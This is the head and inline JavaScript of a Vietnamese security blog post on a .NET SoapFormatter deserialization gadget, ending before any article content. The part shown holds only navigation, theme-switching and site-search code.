<!DOCTYPE html>
<html lang="vi" dir="ltr">

<head prefix="og: http://ogp.me/ns#">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>[.NET deserialize] SoapFormatter:ActivitySurrogateSelector – Edisc Blog</title>
    


  
  <script defer src="/js/fuse.min.32195737929df2c8096e855a5789cbb3f1331224d9169e8705493e7008f47df8.js"></script>



<script src="/js/enquire.min.dfb99dee1e029d51d6cfb672d847929890b1585402de17f5ed092edd72a688b4.js"></script>

<script defer src="/js/lazysizes.min.fb649fcae62177dfe63e67081ddceb830b5ce1f05a4184e9bbb7d87ac4b8f4e5.js"></script>

<script defer src="/js/helper/getParents.min.086022fb02d7a1517e33c2670bffb976b3e80bcacd9caeee0c6a586064f20e42.js"></script>

<script defer src="/js/helper/fadeinout.min.3ce954c8aea3b69cc5e6f734d8273ba4cd48d3a7987dbdca145849bc4b8fc296.js"></script>

<script defer src="/js/helper/closest.min.js"></script>
  
<script>
  "use strict";

  
  
  if (window.NodeList && !NodeList.prototype.forEach) {
    NodeList.prototype.forEach = Array.prototype.forEach;
  }

  
  if (!String.prototype.includes) {
    String.prototype.includes = function (search, start) {
      'use strict';

      if (search instanceof RegExp) {
        throw TypeError('first argument must not be a RegExp');
      }
      if (start === undefined) { start = 0; }
      return this.indexOf(search, start) !== -1;
    };
  }

  
  Document.prototype.append = Element.prototype.append = function append() {
    this.appendChild(_mutation(arguments));
  };
  function _mutation(nodes) {
    if (!nodes.length) {
      throw new Error('DOM Exception 8');
    } else if (nodes.length === 1) {
      return typeof nodes[0] === 'string' ? document.createTextNode(nodes[0]) : nodes[0];
    } else {
      var
      fragment = document.createDocumentFragment(),
      length = nodes.length,
      index = -1,
      node;

      while (++index < length) {
        node = nodes[index];

        fragment.appendChild(typeof node === 'string' ? document.createTextNode(node) : node);
      }

      return fragment;
    }
  }

  
  if (!String.prototype.startsWith) {
    String.prototype.startsWith = function (searchString, position) {
      position = position || 0;
      return this.indexOf(searchString, position) === position;
    };
  }
  


  document.addEventListener('DOMContentLoaded', function () {
    
    var navCollapseBtn = document.querySelector('.navbar__burger');
    navCollapseBtn ? navCollapseBtn.addEventListener('click', function (e) {
      var navCollapse = document.querySelector('.navbarm__collapse');

      if (navCollapse) {
        var dataOpen = navCollapse.getAttribute('data-open');

        if (dataOpen === 'true') {
          navCollapse.setAttribute('data-open', 'false');
          navCollapse.style.maxHeight = 0;
          navCollapseBtn.classList.remove('is-active');
        } else {
          navCollapse.setAttribute('data-open', 'true');
          navCollapse.style.maxHeight = navCollapse.scrollHeight + "px";
          navCollapseBtn.classList.add('is-active');
        }
      }
    }) : null;
    


    
    var tables = document.querySelectorAll('.single__contents > table');
    for (let i = 0; i < tables.length; i++) {
      var table = tables[i];
      var wrapper = document.createElement('div');
      wrapper.className = 'table-wrapper';
      table.parentElement.replaceChild(wrapper, table);
      wrapper.appendChild(table);
    }
    


    
    var footNoteRefs = document.querySelectorAll('.footnote-ref');
    var footNoteBackRefs = document.querySelectorAll('.footnote-backref');

    footNoteRefs ? 
    footNoteRefs.forEach(function(elem, idx) {
      elem.onmouseenter = function () {
        if (navbar.classList.contains('scrolling')) {
          navbar.classList.remove('scrolling');
        }
      }

      elem.onmouseleave = function () {
        if (!navbar.classList.contains('scrolling')) {
          setTimeout(function () {
            navbar.classList.add('scrolling');
          }, 100);
        }
      }

      elem.onclick = function () {
        if (!navbar.classList.contains('scrolling')) {
          navbar.classList.remove('navbar--show');
          navbar.classList.remove('navbar--hide');
          navbar.classList.add('navbar--hide');
        }
      }
    }) : null;

    footNoteBackRefs ? 
    footNoteBackRefs.forEach(function(elem, idx) {
      elem.onmouseenter = function () {
        if (navbar.classList.contains('scrolling')) {
          navbar.classList.remove('scrolling');
        }
      }

      elem.onmouseleave = function () {
        if (!navbar.classList.contains('scrolling')) {
          setTimeout(function() {
            navbar.classList.add('scrolling');
          }, 100);
        }
      }

      elem.onclick = function () {
        if (!navbar.classList.contains('scrolling')) {
          navbar.classList.remove('navbar--show');
          navbar.classList.remove('navbar--hide');
          navbar.classList.add('navbar--hide');
        }
      }
    }) : null;
    


    
    var summaryContainer = document.querySelector('.summary__container');
    var searchResult = document.querySelector('.search-result');
    var searchResultCloseBtn = document.querySelector('.search-result__close');
    searchResultCloseBtn ? searchResultCloseBtn.addEventListener('click', function (e) {
      searchResult.setAttribute('data-display', 'none');
      summaryContainer.setAttribute('data-display', 'block');
    }) : null;
    


    
    document.querySelectorAll('.tab') ? 
    document.querySelectorAll('.tab').forEach(function(elem, idx) {
      var containerId = elem.getAttribute('id');
      var containerElem = elem;
      var tabLinks = elem.querySelectorAll('.tab__link');
      var tabContents = elem.querySelectorAll('.tab__content');
      var ids = [];

      tabLinks && tabLinks.length > 0 ?
      tabLinks.forEach(function(link, index, self) {
        link.onclick = function(e) {
          for (var i = 0; i < self.length; i++) {
            if (index === parseInt(i, 10)) {
              if (!self[i].classList.contains('active')) {
                self[i].classList.add('active');
                tabContents[i].style.display = 'block';
              }
            } else {
              self[i].classList.remove('active');
              tabContents[i].style.display = 'none';
            }
          }
        }
      }) : null;
    }) : null;
    


    
    document.querySelectorAll('.codetab') ? 
    document.querySelectorAll('.codetab').forEach(function(elem, idx) {
      var containerId = elem.getAttribute('id');
      var containerElem = elem;
      var codetabLinks = elem.querySelectorAll('.codetab__link');
      var codetabContents = elem.querySelectorAll('.codetab__content');
      var ids = [];

      codetabLinks && codetabLinks.length > 0 ?
      codetabLinks.forEach(function(link, index, self) {
        link.onclick = function(e) {
          for (var i = 0; i < self.length; i++) {
            if (index === parseInt(i, 10)) {
              if (!self[i].classList.contains('active')) {
                self[i].classList.add('active');
                codetabContents[i].style.display = 'block';
              }
            } else {
              self[i].classList.remove('active');
              codetabContents[i].style.display = 'none';
            }
          }
        }
      }) : null;
    }) : null;
    


    
    var gttBtn = document.getElementById("gtt");
    gttBtn.style.display = "none";
    gttBtn.addEventListener('click', function () {
      if (window.document.documentMode) {
        document.documentElement.scrollTop = 0;
      } else {
        scrollToTop(250);
      }
    });

    function scrollToTop(scrollDuration) {
      var scrollStep = -window.scrollY / (scrollDuration / 15);
      var scrollInterval = setInterval(function () {
        if (window.scrollY != 0) {
          window.scrollBy(0, scrollStep);
        }
        else clearInterval(scrollInterval);
      }, 15);
    }

    var scrollFunction = function () {
      if (document.body.scrollTop > 250 || document.documentElement.scrollTop > 250) {
        gttBtn.style.display = "block";
      } else {
        gttBtn.style.display = "none";
      }
    }
    


    
    var expandBtn = document.querySelectorAll('.expand__button');

    for (let i = 0; i < expandBtn.length; i++) {
      expandBtn[i].addEventListener("click", function () {
        var content = this.nextElementSibling;
        if (content.style.maxHeight) {
          content.style.maxHeight = null;
          this.querySelector('svg').classList.add('expand-icon__right');
          this.querySelector('svg').classList.remove('expand-icon__down');
        } else {
          content.style.maxHeight = content.scrollHeight + "px";
          this.querySelector('svg').classList.remove('expand-icon__right');
          this.querySelector('svg').classList.add('expand-icon__down');
        }
      });
    }
    


    
    var lastScrollTop = window.pageYOffset || document.documentElement.scrollTop;
    var tocElem = document.querySelector('.toc');
    var tableOfContentsElem = tocElem ? tocElem.querySelector('#TableOfContents') : null;
    var toggleTocElem = document.getElementById('toggle-toc');
    var singleContentsElem = document.querySelector('.single__contents');
    var navbar = document.querySelector('.navbar');
    var tocFlexbox = document.querySelector('.toc__flexbox');
    var tocFlexboxOuter = document.querySelector('.toc__flexbox--outer');
    var expandContents = document.querySelectorAll('.expand__content');
    var boxContents = document.querySelectorAll('.box');
    var notAllowedTitleIds = null;

    
    var tocFolding = JSON.parse("true");
    
    var tocLevels = JSON.parse("[\"h2\",\"h3\",\"h4\"]");
    
    if (tocLevels) {
      tocLevels = tocLevels.toString();
    } else {
      tocLevels = "h1, h2, h3, h4, h5, h6";
    }

    
    singleContentsElem && singleContentsElem.querySelectorAll(".tab") ?
    singleContentsElem.querySelectorAll(".tab").forEach(function (elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    expandContents ? expandContents.forEach(function(elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    boxContents ? boxContents.forEach(function(elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    window.onscroll = function () {
      scrollFunction();
      
      var st = window.pageYOffset || document.documentElement.scrollTop;
      if (st > lastScrollTop) { 
        if (st < 250) {
          gttBtn.style.display = "none";
        } else {
          gttBtn.style.display = "block";
        }

        if (st < 45) {
          return null;
        }

        if (navbar.classList.contains('scrolling')) {
          if (!navbar.classList.contains('navbar--hide')) {
            navbar.classList.add('navbar--hide');
          } else if (navbar.classList.contains('navbar--show')) {
            navbar.classList.remove('navbar--show');
          }
        }

        if (singleContentsElem) {
          if (singleContentsElem.querySelectorAll(tocLevels).length > 0) {
            singleContentsElem.querySelectorAll(tocLevels).forEach(function (elem) {
              if (toggleTocElem && !toggleTocElem.checked) {
                return null;
              }

              if (notAllowedTitleIds && notAllowedTitleIds.includes(elem.getAttribute('id'))) {
                return null;
              }
              
              if (document.documentElement.scrollTop >= elem.offsetTop) {
                if (tableOfContentsElem) {
                  var id = elem.getAttribute('id');
                  tocElem.querySelectorAll('a').forEach(function (elem) {
                    elem.classList.remove('active');
                  });
                  tocElem.querySelector('a[href="#' + id + '"]') ?
                    tocElem.querySelector('a[href="#' + id + '"]').classList.add('active') : null;

                  if (false === tocFolding) {
                    
                  } else {
                    tableOfContentsElem.querySelectorAll('ul') ?
                      tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
                        rootUl.querySelectorAll('li').forEach(function (liElem) {
                          liElem.querySelectorAll('ul').forEach(function (ulElem) {
                            ulElem.style.display = 'none';
                          });
                        });
                      }) : null;
                  }

                  var curElem = tableOfContentsElem.querySelector("[href='#" + id + "']");
                  if (curElem && curElem.nextElementSibling) {
                    curElem.nextElementSibling.style.display = 'block';
                  }
                  getParents(curElem, 'ul') ?
                    getParents(curElem, 'ul').forEach(function (elem) {
                      elem.style.display = 'block';
                    }) : null;
                }
              }
            });
          } else {
            if (tocFlexbox) {
              tocFlexbox.setAttribute('data-position', '');
              if (!tocFlexbox.classList.contains('hide')) {
                tocFlexbox.classList.add('hide');
              }
            }
            if (tocFlexboxOuter) {
              tocFlexboxOuter.setAttribute('data-position', '');
              if (!tocFlexboxOuter.classList.contains('hide')) {
                tocFlexboxOuter.classList.add('hide');
              }
            }
          }
        }
      } else { 
        if (st < 250) {
          gttBtn.style.display = "none";
        }

        if (navbar.classList.contains('scrolling')) {
          if (navbar.classList.contains('navbar--hide')) {
            navbar.classList.remove('navbar--hide');
          } else if (!navbar.classList.contains('navbar--show')) {
            navbar.classList.add('navbar--show');
          }
        }

        if (singleContentsElem) {
          if (singleContentsElem.querySelectorAll(tocLevels).length > 0) {
            singleContentsElem.querySelectorAll(tocLevels).forEach(function (elem) {
              if (toggleTocElem && !toggleTocElem.checked) {
                return null;
              }
              
              if (notAllowedTitleIds && notAllowedTitleIds.includes(elem.getAttribute('id'))) {
                return null;
              }

              if (document.documentElement.scrollTop >= elem.offsetTop) {
                if (tableOfContentsElem) {
                  var id = elem.getAttribute('id');
                  tocElem.querySelectorAll('a').forEach(function (elem) {
                    elem.classList.remove('active');
                  });
                  tocElem.querySelector('a[href="#' + id + '"]') ?
                    tocElem.querySelector('a[href="#' + id + '"]').classList.add('active') : null;

                  if (false === tocFolding) {
                    
                  } else {
                    tableOfContentsElem.querySelectorAll('ul') ?
                      tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
                        rootUl.querySelectorAll('li').forEach(function (liElem) {
                          liElem.querySelectorAll('ul').forEach(function (ulElem) {
                            ulElem.style.display = 'none';
                          });
                        });
                      }) : null;
                  }

                  var curElem = tableOfContentsElem.querySelector("[href='#" + id + "']");
                  if (curElem && curElem.nextElementSibling) {
                    curElem.nextElementSibling.style.display = 'block';
                  }
                  getParents(curElem, 'ul') ?
                    getParents(curElem, 'ul').forEach(function (elem) {
                      elem.style.display = 'block';
                    }) : null;
                }
              }
            });
          } else {
            if (tocFlexbox && !tocFlexbox.classList.contains('hide')) {
              tocFlexbox.classList.add('hide');
            }
            if (tocFlexboxOuter && !tocFlexboxOuter.classList.contains('hide')) {
              tocFlexboxOuter.classList.add('hide');
            }
          }
          
        }

        if (tableOfContentsElem && document.documentElement.scrollTop < 250) {
          if (false === tocFolding) {

          } else {
            tableOfContentsElem.querySelector('ul') ?
              tableOfContentsElem.querySelector('ul').querySelectorAll('li').forEach(function (liElem) {
                liElem.querySelectorAll('ul').forEach(function (ulElem) {
                  ulElem.style.display = 'none';
                });
              }) : null;
          }
        }
      }
      lastScrollTop = st <= 0 ? 0 : st;
    };
  


  
    var localTheme = localStorage.getItem('theme');
    var rootEleme = document.getElementById('root');
    var selectThemeElem = document.querySelectorAll('.select-theme');
    var selectThemeItemElem = document.querySelectorAll('.select-theme__item');
    
    
    var skinDarkCode = JSON.parse("\"dark\"");
    
    var skinLightCode = JSON.parse("\"light\"");
    
    var skinHackerCode = JSON.parse("\"hacker\"");
    
    var skinSolarizedCode = JSON.parse("\"solarized\"");
    
    var skinKimbieCode = JSON.parse("\"kimbie\"");

    var setMetaColor = function(themeColor) {
      var metaMsapplicationTileColor = document.getElementsByName('msapplication-TileColor')[0];
      var metaThemeColor = document.getElementsByName('theme-color')[0];
      var metaMsapplicationNavbuttonColor = document.getElementsByName('msapplication-navbutton-color')[0];
      var metaAppleMobileWebAappStatusBarStyle = document.getElementsByName('apple-mobile-web-app-status-bar-style')[0];

      if (themeColor.includes('dark')) {
        metaMsapplicationTileColor.setAttribute('content', '#fcfcfa');
        metaThemeColor.setAttribute('content', '#403E41');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#403E41');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#403E41');
      } else if (themeColor.includes('light')) {
        metaMsapplicationTileColor.setAttribute('content', '#555');
        metaThemeColor.setAttribute('content', '#eee');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#eee');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#eee');
      } else if (themeColor.includes('hacker')) {
        metaMsapplicationTileColor.setAttribute('content', '#e3cd26');
        metaThemeColor.setAttribute('content', '#252526');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#252526');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#252526');
      } else if (themeColor.includes('solarized')) {
        metaMsapplicationTileColor.setAttribute('content', '#d3af86');
        metaThemeColor.setAttribute('content', '#51412c');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#51412c');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#51412c');
      } else if (themeColor.includes('kimbie')) {
        metaMsapplicationTileColor.setAttribute('content', '#586e75');
        metaThemeColor.setAttribute('content', '#eee8d5');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#eee8d5');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#eee8d5');
      }
    }

    var parseSkinCode = function(themeText) {
      if (themeText === skinDarkCode) {
        return 'dark';
      } else if (themeText === skinLightCode) {
        return 'light';
      } else if (themeText === skinHackerCode) {
        return 'hacker';
      } else if (themeText === skinSolarizedCode) {
        return 'solarized';
      } else if (themeText === skinKimbieCode) {
        return 'kimbie';
      }
    }
    
    if (localTheme) {
      selectThemeItemElem ? 
      selectThemeItemElem.forEach(function (elem) {
        if (elem.text.trim() === localTheme) {
          elem.classList.add('is-active');
        } else {
          elem.classList.remove('is-active');
        }
      }) : null;

      setMetaColor(localTheme);
    } else {
      setMetaColor(rootEleme.className);
    }

    selectThemeItemElem ? 
    selectThemeItemElem.forEach(function (v, i) {
      v.addEventListener('click', function (e) {
        var selectedThemeVariant = parseSkinCode(e.target.text.trim());
        localStorage.setItem('theme', selectedThemeVariant);
        setMetaColor(selectedThemeVariant);

        rootEleme.removeAttribute('class');
        rootEleme.classList.add('theme__' + selectedThemeVariant);
        selectThemeElem.forEach(function(rootElem) {
          rootElem.querySelectorAll('a').forEach(function (elem) {
            if (elem.classList) {
              if (elem.text.trim() === selectedThemeVariant) {
                if (!elem.classList.contains('is-active')) {
                  elem.classList.add('is-active');
                }
              } else {
                if (elem.classList.contains('is-active')) {
                  elem.classList.remove('is-active');
                }
              }
            }
          });
        });

        if (window.mermaid) {
          if (selectedThemeVariant === "dark" || selectedThemeVariant === "hacker") {
            mermaid.initialize({ theme: 'dark' });
            location.reload();
          } else {
            mermaid.initialize({ theme: 'default' });
            location.reload();
          }
        }

        var utterances = document.getElementById('utterances');
        if (utterances) {
          utterances.querySelector('iframe').contentWindow.postMessage({
            type: 'set-theme',
            theme: selectedThemeVariant === "dark" || selectedThemeVariant === "hacker" ? 'photon-dark' : selectedThemeVariant === 'kimbie' ? 'github-dark-orange' : 'github-light',
          }, 'https://utteranc.es');
        }

        var twitterCards = document.querySelectorAll('.twitter-timeline');
        if (twitterCards) {
          window.postMessage({
            type: 'set-twitter-theme',
            theme: selectedThemeVariant === 'light' || selectedThemeVariant === 'solarized' ? 'light' : 'dark',
          });
        }
      });
    }) : null;
  


  
    
    var baseurl = JSON.parse("\"https://minhlongmt183.github.io/\"");
    
    var permalink = JSON.parse("\"https://minhlongmt183.github.io/posts/dot_net_101_soapformatter_activitysurrogateselector/\"");
    
    var langprefix = JSON.parse("\"\"");
    var searchResults = null;
    var searchMenu = null;
    var searchText = null;
    
    
    var enableSearch = JSON.parse("true");
    
    var searchDistance = JSON.parse("100");
    
    var searchThreshold = JSON.parse("0.4");
    
    var searchContent = JSON.parse("true");
    
    var enableSearchHighlight = JSON.parse("true");
    
    var searchResultPosition = JSON.parse("\"main\"");
    
    var sectionType = JSON.parse("\"posts\"");
    
    var kind = JSON.parse("\"page\"");
    
    var fuse = null;

    if (enableSearch) {
      (function initFuse() {
        var xhr = new XMLHttpRequest();
        if (sectionType === "publication" && kind !== "page") {
          xhr.open('GET', permalink + "index.json");
        } else {
          xhr.open('GET', baseurl + langprefix + "/index.json");
        }
        
        xhr.setRequestHeader('Content-Type', 'application/json; charset=utf-8');
        xhr.onload = function () {
          if (xhr.status === 200) {
            fuse = new Fuse(JSON.parse(xhr.response.toString('utf-8')), {
              keys: sectionType.includes('publication') ? ['title', 'abstract'] : 
                searchContent ? ['title', 'description', 'content'] : ['title', 'description'],
              includeMatches: enableSearchHighlight,
              shouldSort: true, 
              threshold: searchThreshold ? searchThreshold : 0.4, 
              location: 0, 
              distance: searchDistance ? searchDistance : 100, 
              maxPatternLength: 32,
              minMatchCharLength: 1,
              isCaseSensitive: false, 
              findAllMatches: false, 
              useExtendedSearch: false, 
            });
            window.fuse = fuse;
          }
          else {
            console.error('[' + xhr.status + ']Error:', xhr.statusText);
          }
        };
        xhr.send();
      })();
    }

    function makeLi(ulElem, obj) {
      var li = document.createElement('li');
      li.className = 'search-result__item';
      
      var a = document.createElement('a');
      a.innerHTML = obj.item.title;
      a.setAttribute('class', 'search-result__item--title');
      a.setAttribute('href', obj.item.uri);

      var descDiv = document.createElement('div');
      descDiv.setAttribute('class', 'search-result__item--desc');
      if (obj.item.description) {
        descDiv.innerHTML = obj.item.description;
      } else if (obj.item.content) {
        descDiv.innerHTML = obj.item.content.substring(0, 225);
      }
      
      li.appendChild(a);
      li.appendChild(descDiv);
      ulElem.appendChild(li);
    }

    function makeHighlightLi(ulElem, obj) {
      var li = document.createElement('li');
      li.className = 'search-result__item';
      var descDiv = null;

      var a = document.createElement('a');
      a.innerHTML = obj.item.title;
      a.setAttribute('class', 'search-result__item--title');
      a.setAttribute('href', obj.item.uri);

      if (obj.matches && obj.matches.length) {
        for (var i = 0; i < obj.matches.length; i++) {
          if ('title' === obj.matches[i].key) {
            a = document.createElement('a');
            a.innerHTML = generateHighlightedText(obj.matches[i].value, obj.matches[i].indices);
            a.setAttribute('class', 'search-result__item--title');
            a.setAttribute('href', obj.item.uri);
          }
          
          if ('description' === obj.matches[i].key) {
            descDiv = document.createElement('div');
            descDiv.setAttribute('class', 'search-result__item--desc');
            descDiv.innerHTML = generateHighlightedText(obj.item.description, obj.matches[i].indices);
          } else if ('content' === obj.matches[i].key) {
            if (!descDiv) {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = generateHighlightedText(obj.item.content.substring(0, 150), obj.matches[i].indices);
            }
          } else {
            if (obj.item.description) {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = obj.item.description;
            } else {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = obj.item.content.substring(0, 150);
            }
          }
        }

        li.appendChild(a);
        if (descDiv) {
          li.appendChild(descDiv);
        }
        if (li) {
          ulElem.appendChild(li);
        }
      }
    }

    function renderSearchResultsSide(searchText, results) {
      searchResults = document.getElementById('search-results');
      searchMenu = document.getElementById('search-menu');
      searchResults.setAttribute('class', 'dropdown is-active');
      
      var ul = document.createElement('ul');
      ul.setAttribute('class', 'dropdown-content search-content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          a.setAttribute('href', result.uri);
          a.setAttribute('class', 'dropdown-item');
          a.appendChild(li);

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.title;
          titleDiv.setAttribute('class', 'menu-item__title');

          var descDiv = document.createElement('div');
          descDiv.setAttribute('class', 'menu-item__desc');
          if (result.description) {
            descDiv.innerHTML = result.description;
          } else if (result.content) {
            descDiv.innerHTML = result.content.substring(0, 150);
          }

          li.appendChild(titleDiv);
          li.appendChild(descDiv);
          ul.appendChild(a);
        });
      } else {
        var li = document.createElement('li');
        li.setAttribute('class', 'dropdown-item');
        li.innerText = 'No results found';
        ul.appendChild(li);
      }

      while (searchMenu.hasChildNodes()) {
        searchMenu.removeChild(
          searchMenu.lastChild
        );
      }
      
      searchMenu.appendChild(ul);
    }

    function renderSearchHighlightResultsSide(searchText, results) {
      searchResults = document.getElementById('search-results');
      searchMenu = document.getElementById('search-menu');
      searchResults.setAttribute('class', 'dropdown is-active');

      var ul = document.createElement('ul');
      ul.setAttribute('class', 'dropdown-content search-content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          var descDiv = null;

          a.setAttribute('href', result.item.uri);
          a.setAttribute('class', 'dropdown-item');
          a.appendChild(li);

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.item.title;
          titleDiv.setAttribute('class', 'menu-item__title');
          
          if (result.matches && result.matches.length) {
            for (var i = 0; i < result.matches.length; i++) {
              if ('title' === result.matches[i].key) {
                titleDiv.innerHTML = generateHighlightedText(result.matches[i].value, result.matches[i].indices);
              }

              if ('description' === result.matches[i].key) {
                descDiv = document.createElement('div');
                descDiv.setAttribute('class', 'menu-item__desc');
                descDiv.innerHTML = generateHighlightedText(result.item.description, result.matches[i].indices);
              } else if ('content' === result.matches[i].key) {
                if (!descDiv) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = generateHighlightedText(result.item.content.substring(0, 150), result.matches[i].indices);
                }
              } else {
                if (result.item.description) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = result.item.description;
                } else {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = result.item.content.substring(0, 150);
                }
              }
            }
            
            li.appendChild(titleDiv);
            if (descDiv) {
              li.appendChild(descDiv);
            }
            ul.appendChild(a);
          }
        });
      } else {
        var li = document.createElement('li');
        li.setAttribute('class', 'dropdown-item');
        li.innerText = 'No results found';
        ul.appendChild(li);
      }

      while (searchMenu.hasChildNodes()) {
        searchMenu.removeChild(
          searchMenu.lastChild
        );
      }
      searchMenu.appendChild(ul);
    }

    function renderSearchResultsMobile(searchText, results) {
      searchResults = document.getElementById('search-mobile-results');

      var content = document.createElement('div');
      content.setAttribute('class', 'mobile-search__content');

      if (results.length > 0) {
        results.forEach(function (result) {
          var item = document.createElement('a');
          item.setAttribute('href', result.uri);
          item.innerHTML = '<div class="mobile-search__item"><div class="mobile-search__item--title">📄 ' + result.title + '</div><div class="mobile-search__item--desc">' + (result.description ? result.description : result.content) + '</div></div>';
          content.appendChild(item);
        });
      } else {
        var item = document.createElement('span');
        content.appendChild(item);
      }

      let wrap = document.getElementById('search-mobile-results');
      while (wrap.firstChild) {
        wrap.removeChild(wrap.firstChild)
      }
      searchResults.appendChild(content);      
    }

    function renderSearchHighlightResultsMobile(searchText, results) {
      searchResults = document.getElementById('search-mobile-results');

      var ul = document.createElement('div');
      ul.setAttribute('class', 'mobile-search__content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          var descDiv = null;

          a.setAttribute('href', result.item.uri);
          a.appendChild(li);
          li.setAttribute('class', 'mobile-search__item');

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.item.title;
          titleDiv.setAttribute('class', 'mobile-search__item--title');
          
          if (result.matches && result.matches.length) {
            for (var i = 0; i < result.matches.length; i++) {
              if ('title' === result.matches[i].key) {
                titleDiv.innerHTML = generateHighlightedText(result.matches[i].value, result.matches[i].indices);
              }

              if ('description' === result.matches[i].key) {
                descDiv = document.createElement('div');
                descDiv.setAttribute('class', 'mobile-search__item--desc');
                descDiv.innerHTML = generateHighlightedText(result.item.description, result.matches[i].indices);
              } else if ('content' === result.matches[i].key) {
                if (!descDiv) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = generateHighlightedText(result.item.content.substring(0, 150), result.matches[i].indices);
                }
              } else {
                if (result.item.description) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = result.item.description;
                } else {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = result.item.content.substring(0, 150);
                }
              }
            }
            
            li.appendChild(titleDiv);
            if (descDiv) {
              li.appendChild(descDiv);
            }
            ul.appendChild(a);
          }
        });
      } else {
        var item = document.createElement('span');
        ul.appendChild(item);
      }

      let wrap = document.getElementById('search-mobile-results');
      while (wrap.firstChild) {
        wrap.removeChild(wrap.firstChild)
      }
      searchResults.appendChild(ul);
    }

    function generateHighlightedText(text, regions) {
      if (!regions) {
        return text;
      }

      var content = '', nextUnhighlightedRegionStartingIndex = 0;

      regions.forEach(function(region) {
        if (region[0] === region[1]) {
          return null;
        }
        
        content += '' +
          text.substring(nextUnhighlightedRegionStartingIndex, region[0]) +
          '<span class="search__highlight">' +
            text.substring(region[0], region[1] + 1) +
          '</span>' +
        '';
        nextUnhighlightedRegionStartingIndex = region[1] + 1;
      });

      content += text.substring(nextUnhighlightedRegionStartingIndex);

      return content;
    };

    var searchElem = document.getElementById('search');
    var searchMobile = document.getElementById('search-mobile');
    var searchResultsContainer = document.getElementById('search-results');

    searchElem ?
    searchElem.addEventListener('input', function(e) {
      if (!e.target.value | window.innerWidth < 770) {
        searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);
      
      if (searchResultPosition === "main") {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsMain(searchText, results);
        } else {
          renderSearchResultsMain(searchText, results);
        }
      } else {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsSide(searchText, results);
        } else {
          renderSearchResultsSide(searchText, results);
        }
        
        var dropdownItems = searchResultsContainer.querySelectorAll('.dropdown-item');
        dropdownItems ? dropdownItems.forEach(function(item) {
          item.addEventListener('mousedown', function(e) {
            e.target.click();
          });
        }) : null;
      }
    }) : null;

    searchElem ? 
    searchElem.addEventListener('blur', function() {
      if (window.innerWidth < 770) {
        return null;
      }
      searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
    }) : null;

    searchElem ? 
    searchElem.addEventListener('click', function(e) {
      if (window.innerWidth < 770) {
        return null;
      }
      if (!e.target.value) {
        searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);

      if (searchResultPosition === "main") {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsMain(searchText, results);
        } else {
          renderSearchResultsMain(searchText, results);
        }
      } else{
        if (enableSearchHighlight) {
          renderSearchHighlightResultsSide(searchText, results);
        } else {
          renderSearchResultsSide(searchText, results);
        }

        var dropdownItems = searchResultsContainer.querySelectorAll('.dropdown-item');
        dropdownItems ? dropdownItems.forEach(function (item) {
          item.addEventListener('mousedown', function (e) {
            e.target.click();
          });
        }) : null;
      }
    }) : null;

    var searchMenuElem = document.getElementById("search-menu");
    var activeItem = document.querySelector('#search-menu .dropdown-item.is-active');
    var activeIndex = null;
    var items = null;
    var searchContainerMaxHeight = 350;

    searchElem ? 
